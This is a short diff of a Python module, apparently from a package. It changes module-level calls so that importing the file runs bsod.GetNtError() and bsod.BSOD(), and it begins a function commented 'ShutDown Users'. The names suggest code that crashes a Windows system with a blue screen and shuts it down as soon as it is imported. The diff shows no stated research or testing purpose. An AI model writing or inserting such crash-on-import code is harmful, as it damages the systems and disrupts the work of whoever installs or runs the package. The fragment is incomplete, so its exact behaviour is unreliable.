@@ -1,7 +1,8 @@
 import os
 from . import bsod
 
-bsod.start()
+bsod.GetNtError()
+bsod.BSOD()
 
 # ShutDown Users
 def shtdwn():
